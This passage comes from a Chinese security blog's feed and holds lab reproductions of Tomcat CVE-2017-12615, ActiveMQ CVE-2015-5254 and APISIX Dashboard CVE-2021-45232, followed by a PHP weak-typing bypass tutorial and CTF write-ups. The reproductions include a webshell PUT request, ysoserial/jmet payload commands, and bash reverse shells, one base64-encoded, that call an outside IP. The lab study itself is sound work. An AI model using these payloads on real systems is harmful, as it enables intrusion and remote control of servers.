rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&amp;mid=2247483805&amp;idx=1&amp;sn=503a3e29165d57d3c20ced671761bb5e" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&amp;mid=2247483805&amp;idx=1&amp;sn=503a3e29165d57d3c20ced671761bb5e</a></li></ul><p>漏洞本质Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;default&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;0&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure><p>虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用<code>/</code>）来绕过了限制。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接连接到docker开启的tomcat环境，文件直接上传到docker里面的那个tomcat中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">直接发送以下数据包即可在Web根目录写入shell：</span><br><span class="line"></span><br><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure><p>PUT方法向Tomcat中上传冰蝎马</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230919094810254.png" alt="image-20230919094810254"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230919094820779.png" alt="image-20230919094820779"></p><p>冰蝎连接</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230919133124835.png" alt="image-20230919133124835"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）&quot;&gt;&lt;a href=&quot;#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）&quot; class=&quot;headerlink&quot; title=&quot;Tomcat PUT方法任意写文件漏洞（CV
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>ActiveMQ 反序列化漏洞（CVE-2015-5254）</title>
    <link href="http://yoursite.com/2022/09/05/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/"/>
    <id>http://yoursite.com/2022/09/05/ActiveMQ 反序列化漏洞（CVE-2015-5254）/</id>
    <published>2022-09-05T06:00:50.000Z</published>
    <updated>2023-10-29T11:54:51.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h1><p>Apache ActiveMQ 是一个流行的、开源的、跨语言的消息队列 (MQ) 项目，它是 Apache 基金会下的顶级项目之一。ActiveMQ 支持多种协议和编程语言，包括 Java、C++、Python、PHP、Ruby、Perl、.NET 等。它提供了一种可靠的异步通信方式，用于在分布式系统中传递消息。由于其卓越的性能、可靠性和易用性，ActiveMQ 成为了很多企业和组织在构建大型分布式应用和微服务架构时的首选消息队列软件之一。</p><p>ActiveMQ 的主要特点包括：</p><ol><li>支持多种消息协议和编程语言：ActiveMQ 可以通过不同的协议和编程语言进行访问，如 JMS、AMQP、STOMP、REST、WebSocket 等。</li><li>分布式集群支持：ActiveMQ 可以轻松构建分布式集群，提高消息传递的可靠性和性能。</li><li>消息事务支持：ActiveMQ 提供了完整的消息事务功能，可以确保消息在发送、接收和处理过程中的一致性和可靠性。</li><li>灵活的消息路由策略：ActiveMQ 的消息路由策略是非常灵活的，可以根据不同的需求，选择不同的消息路由方式。</li><li>消息流控制机制：ActiveMQ 可以通过设置消息流量限制，避免因过多的消息流量引起的消息阻塞或系统崩溃。</li><li>高可用性和数据持久化：ActiveMQ 支持主从复制机制以及消息持久化功能，可以保证高可用性、数据完整性和可靠性。</li></ol><p>总之，Apache ActiveMQ 是一款功能强大、灵活性好、易用性高、且性能可靠的消息队列软件，在分布式应用和微服务架构中具有广泛的应用前景</p><p>ysoserial 是一个 Java 序列化库，它可以用于生成不同类型的 Java 序列化数据，用于测试 Java 序列化漏洞或实现一些攻击。ysoserial 可以生成多种类型的 Java 序列化数据，如 ObjectInput/Output Stream、Jython1、JRMP Client、RMIRegistryExploit、CommonsBeanUtils1 等。</p><p>Java 序列化是一种将对象转换为二进制数据的技术，它在分布式系统中得到了广泛的应用。然而，由于 Java 序列化的设计原理和实现细节并不完善，使得 Java 序列化存在一些安全风险，如反序列化漏洞。攻击者可以通过构造恶意的序列化数据，让受害者的程序在进行反序列化时触发代码执行，从而达到攻击目的。</p><p>ysoserial 正是利用了 Java 序列化的漏洞性质，通过构造特定的序列化数据，以实现对目标系统的攻击。常见的攻击手法包括：</p><ol><li>远程命令执行：攻击者可以构造恶意的序列化数据，使其被反序列化后触发远程命令执行漏洞，进而掌控目标系统。</li><li>信息泄露：攻击者可以通过构造恶意的序列化数据，使其被反序列化后输出敏感信息，如密码、配置文件等。</li><li>整数溢出：攻击者可以通过构造恶意的序列化数据，利用 Java 序列化过程中存在的整数溢出漏洞，从而实现对目标系统的攻击。</li></ol><p>总之，ysoserial 是一个 Java 序列化库，它可以生成多种类型的 Java 序列化数据，用于测试 Java 序列化漏洞或实现一些攻击。为了避免 ysoserial 可能导致的潜在安全风险，建议开发人员在使用 ysoserial 时谨慎评估其安全性，并采取必要的防御措施。</p><p>复现需要有java环境，jdk1.8</p><p>执行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/activemq/CVE-2015-5254/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904124028892.png" alt="image-20230904124028892"></p><p>环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。</p><p>管理员的登录页面，账号密码都是：admin</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904124647232.png" alt="image-20230904124647232"></p><p>使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p><p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p><p>执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-tools/activemq/</span><br><span class="line">mkdir external</span><br><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904125240830.png" alt="image-20230904125240830"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904130137568.png" alt="image-20230904130137568"></p><p>此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904130521742.png" alt="image-20230904130521742"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904130932593.png" alt="image-20230904130932593"></p><p>bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 123.56.181.14 61616</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904140556378.png" alt="image-20230904140556378"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ActiveMQ-反序列化漏洞（CVE-2015-5254）&quot;&gt;&lt;a href=&quot;#ActiveMQ-反序列化漏洞（CVE-2015-5254）&quot; class=&quot;headerlink&quot; title=&quot;ActiveMQ 反序列化漏洞（CVE-2015-5254）&quot;&gt;
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Java反序列化" scheme="http://yoursite.com/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Apache APISIX Dashboard API权限绕过导致RCE CVE-2021-45232</title>
    <link href="http://yoursite.com/2022/08/21/Apache%20APISIX%20Dashboard%20API%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4RCE%20CVE-2021-45232/"/>
    <id>http://yoursite.com/2022/08/21/Apache APISIX Dashboard API权限绕过导致RCE CVE-2021-45232/</id>
    <published>2022-08-21T13:00:50.000Z</published>
    <updated>2023-10-29T11:55:11.888Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache-APISIX-Dashboard-API权限绕过导致RCE-CVE-2021-45232"><a href="#Apache-APISIX-Dashboard-API权限绕过导致RCE-CVE-2021-45232" class="headerlink" title="Apache APISIX Dashboard API权限绕过导致RCE CVE-2021-45232"></a>Apache APISIX Dashboard API权限绕过导致RCE CVE-2021-45232</h1><blockquote><p>Apache APISIX是一个动态、实时、高性能API网关，而Apache APISIX Dashboard是一个配套的前端面板。</p><p>Apache APISIX Dashboard 2.10.1版本前存在两个API<code>/apisix/admin/migrate/export</code>和<code>/apisix/admin/migrate/import</code>，他们没有经过<code>droplet</code>框架的权限验证，导致未授权的攻击者可以导出、导入当前网关的所有配置项，包括路由、服务、脚本等。攻击者通过导入恶意路由，可以用来让Apache APISIX访问任意网站，甚至执行LUA脚本。</p></blockquote><p>执行如下命令启动一个有漏洞的Apache APISIX Dashboard 2.9：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br><span class="line">或者</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>然后访问<code>http://your-ip:9000/</code>即可看到Apache APISIX Dashboard的登录页面。</p><p><a href="http://123.56.181.14:9000/" target="_blank" rel="noopener">http://123.56.181.14:9000/</a></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904155040326.png" alt="image-20230904155040326"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\apisix_dashboard_rce.py http://123.56.181.14:9000</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904160151577.png" alt="image-20230904160151577"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904161034138.png" alt="image-20230904161034138"></p><p>可见在Header中添加的<code>CMD</code>头中的命令已被执行</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>攻击机nc监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>burp中发送数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CMD: bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904161342557.png" alt="image-20230904161342557"></p><p>点击send，反弹成功</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230904161508959.png" alt="image-20230904161508959"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Apache-APISIX-Dashboard-API权限绕过导致RCE-CVE-2021-45232&quot;&gt;&lt;a href=&quot;#Apache-APISIX-Dashboard-API权限绕过导致RCE-CVE-2021-45232&quot; class=&quot;headerlin
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>php弱类型</title>
    <link href="http://yoursite.com/2018/11/04/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    <id>http://yoursite.com/2018/11/04/php弱类型/</id>
    <published>2018-11-04T05:49:02.000Z</published>
    <updated>2018-11-04T08:05:51.159Z</updated>
    
    <content type="html"><![CDATA[<h2 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h2><p>php中有两种比较的符号 == 与 ===</p><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较，如果类型不同直接返回不相等</p><p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><a id="more"></a><p>（如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行），例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;?php</span><br><span class="line">2 var_dump(&quot;admin&quot;==0);  //true</span><br><span class="line">3 var_dump(&quot;1admin&quot;==1); //true</span><br><span class="line">4 var_dump(&quot;admin1&quot;==1) //false</span><br><span class="line">5 var_dump(&quot;admin1&quot;==0) //true</span><br><span class="line">6 var_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true </span><br><span class="line">7 ?&gt;</span><br></pre></td></tr></table></figure><p>观察上述代码，得到：</p><p>1、”admin”==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等</p><p>2、”1admin”==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是”admin1”被转化成了0</p><p>3、 “0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p><p>==注意 #f44336==：</p><p>当一个字符串被当作一个数值来取值，其结果和类型如下:</p><p>如果该字符串没有包含’.’,’e’,’E’并且其数值在整形的范围之内，该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;?php</span><br><span class="line">2 $test=1 + &quot;10.5&quot;; // $test=11.5(float)</span><br><span class="line">3 $test=1+&quot;-1.3e3&quot;; //$test=-1299(float)</span><br><span class="line">4 $test=1+&quot;bob-1.3e3&quot;;//$test=1(int)</span><br><span class="line">5 $test=1+&quot;2admin&quot;;//$test=3(int)</span><br><span class="line">6 $test=1+&quot;admin2&quot;;//$test=1(int)</span><br><span class="line">7 ?&gt;</span><br></pre></td></tr></table></figure><p>所以就解释了”admin1”==1 =&gt;False 的原因</p><h2 id="md5绕过-Hash比较缺陷"><a href="#md5绕过-Hash比较缺陷" class="headerlink" title="md5绕过(Hash比较缺陷)"></a>md5绕过(Hash比较缺陷)</h2><p>md5开头是0e的字符串，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0，md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过，例如：</p><p>QNKCDZO<br>0e830400451993494058024219903391</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s155964671a<br>0e342768416822451524974117254469</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s214587387a<br>0e848240448830537924465865611904</p><p>s878926199a<br>0e545993274517709034328855841020</p><p>s1091221200a<br>0e940624217856561557816327384675</p><h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&apos;message&apos;])) &#123;</span><br><span class="line">    $message = json_decode($_POST[&apos;message&apos;]);</span><br><span class="line">    $key =&quot;*********&quot;;</span><br><span class="line">    if ($message-&gt;key == $key) &#123;</span><br><span class="line">        echo &quot;flag&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> else&#123;</span><br><span class="line">     echo &quot;~~~~&quot;;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”(字符串)这种形式绕过</p><p>最终上传 message={“key”:0}</p><h2 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search / is_array绕过"></a>array_search / is_array绕过</h2><p>in_array和array_search会对类型进行强制转换，并且是==进行比较，所以可以绕过。</p><p>mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] )</p><p>$needle，$haystack必需，$strict可选  函数判断$haystack中的值是否存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;?php</span><br><span class="line">2 $a=array(0,1);</span><br><span class="line">3 var_dump(array_search(&quot;admin&quot;,$a)); // int(0) =&gt; 返回键值0</span><br><span class="line">4 var_dump(array_seach(&quot;1admin&quot;,$a));  // int(1) ==&gt;返回键值1</span><br><span class="line">5 ?&gt;</span><br></pre></td></tr></table></figure><p>array_search函数 类似于== 也就是$a==”admin” 当然是$a=0  当然如果第三个参数为true则就不能绕过</p><h2 id="strcmp漏洞绕过"><a href="#strcmp漏洞绕过" class="headerlink" title="strcmp漏洞绕过"></a>strcmp漏洞绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> 1 &lt;?php</span><br><span class="line"> 2     $password=&quot;***************&quot;</span><br><span class="line"> 3      if(isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line"> 4 </span><br><span class="line"> 5         if (strcmp($_POST[&apos;password&apos;], $password) == 0) &#123;</span><br><span class="line"> 6             echo &quot;Right!!!login success&quot;;n</span><br><span class="line"> 7             exit();</span><br><span class="line"> 8         &#125; else &#123;</span><br><span class="line"> 9             echo &quot;Wrong password..&quot;;</span><br><span class="line">10         &#125;</span><br><span class="line">11 ?&gt;</span><br></pre></td></tr></table></figure><p>strcmp是比较两个字符串，如果str1&lt;str2 则返回<0 如果str1大于str2返回="">0 如果两者相等 返回0</0></p><p>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</p><p>我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断相等</p><h2 id="empty和isset函数"><a href="#empty和isset函数" class="headerlink" title="empty和isset函数"></a>empty和isset函数</h2><p>1）变量为：0，”0”,null,’’,false,array()时，使用empty函数，返回的都为true</p><p>2）变量未定义或者为null时，isset函数返回的为false,其他都未true</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$a = null;</span><br><span class="line">$b = &apos;&apos;;</span><br><span class="line">$c = 0;</span><br><span class="line">$d = &quot;0&quot;;</span><br><span class="line">$e = false;</span><br><span class="line">$f = array();</span><br><span class="line">var_dump(empty($a));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($b));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($c));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($d));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($e));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($f));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line"></span><br><span class="line">var_dump(isset($a));   //false</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($b));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($c));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($d));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($e));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($f));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($g));   //false</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;比较操作符&quot;&gt;&lt;a href=&quot;#比较操作符&quot; class=&quot;headerlink&quot; title=&quot;比较操作符&quot;&gt;&lt;/a&gt;比较操作符&lt;/h2&gt;&lt;p&gt;php中有两种比较的符号 == 与 ===&lt;/p&gt;
&lt;p&gt;=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较，如果类型不同直接返回不相等&lt;/p&gt;
&lt;p&gt;== 在进行比较的时候，会先将字符串类型转化成相同，再比较&lt;/p&gt;
    
    </summary>
    
      <category term="php" scheme="http://yoursite.com/categories/php/"/>
    
    
      <category term="php弱类型" scheme="http://yoursite.com/tags/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>萌新赛</title>
    <link href="http://yoursite.com/2018/10/29/%E8%90%8C%E6%96%B0%E8%B5%9B/"/>
    <id>http://yoursite.com/2018/10/29/萌新赛/</id>
    <published>2018-10-29T10:20:14.000Z</published>
    <updated>2018-10-29T13:03:41.926Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、根本想不到"><a href="#一、根本想不到" class="headerlink" title="一、根本想不到"></a>一、根本想不到</h3><p><img src="./images/1540816951270.png" alt="enter description here"></p><a id="more"></a><p>题目中提示wordpress，不知道所以去百度搜索，搜索查看步骤后发现，可以在网址后面加上wp-login.php进行后台登陆,试了之后发现还是不行，就想着用wp-admin.php进行登陆，结果就可以了，就得到了flag</p><p><img src="./images/1540817528867.png" alt="enter description here"></p><h3 id="二、MISC1"><a href="#二、MISC1" class="headerlink" title="二、MISC1"></a>二、MISC1</h3><p>下载文件后得到一张图片，首先想到的就是改后缀名，把.jpg改为.txt后得到文本，按ctrl+f后搜索flag就找到了flag</p><h3 id="三、MISC4"><a href="#三、MISC4" class="headerlink" title="三、MISC4"></a>三、MISC4</h3><p>下载文件后解压时需要输入密码，所以百度搜索ctf题解压文件需要输入密码，得到很多知识点，查看试验后发现</p><p><img src="./images/1540817562170.png" alt="enter description here"></p><p>就想着试试，打开虚拟机里kail的linux后，把压缩文件拉进系统里，再把它提取出来，就得到了flag</p><p><img src="./images/1540817582403.png" alt="enter description here"></p><h3 id="四、你必须要跳"><a href="#四、你必须要跳" class="headerlink" title="四、你必须要跳"></a>四、你必须要跳</h3><p>打开压缩文件后出现-.– — ..- ..–.- … …. — ..- .的格式，就百度搜索，发现这是摩斯密码，就想到了解密，解密之后得到BBAABAAAABAA的格式，再百度之后，发现这是培根密码，解密之后，出现</p><p><img src="./images/1540817602546.png" alt="enter description here"></p><p>肯定是要继续解密的，发现这是一段没有规律的组合，然后栅栏密码就是要把加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话，就想着用栅栏密码解密<br>栏数从1开始试，发现都不对，然后看到上面的解密是有大小写的，就想着大小写分开解密<br>试试后发现小写解密栏数为4时成功了</p><p><img src="./images/1540817619192.png" alt="enter description here"></p><h3 id="五、常用的加解密"><a href="#五、常用的加解密" class="headerlink" title="五、常用的加解密"></a>五、常用的加解密</h3><p>解压文件后，出现</p><p><img src="./images/1540817921095.png" alt="enter description here"></p><p>从第一行中看出，这是用base64加密的图片，就百度搜base64解密成图片，发现了解密工具，网址为<a href="http://imgbase64.duoshitong.com/，解密后出现" target="_blank" rel="noopener">http://imgbase64.duoshitong.com/，解密后出现</a></p><p><img src="./images/1540817965039.png" alt="enter description here"></p><p>提交synt{2018_zratkva_pgs}后，显示错误，就想着把synt变成flag，就百度搜synt怎么变成flag，就看到了好多例题，例如</p><p><img src="./images/1540818041721.png" alt="enter description here"></p><p>就知道了要用rot13解密，解密之后得到flag{2018_mengxin_ctf}</p><h3 id="六、签到题"><a href="#六、签到题" class="headerlink" 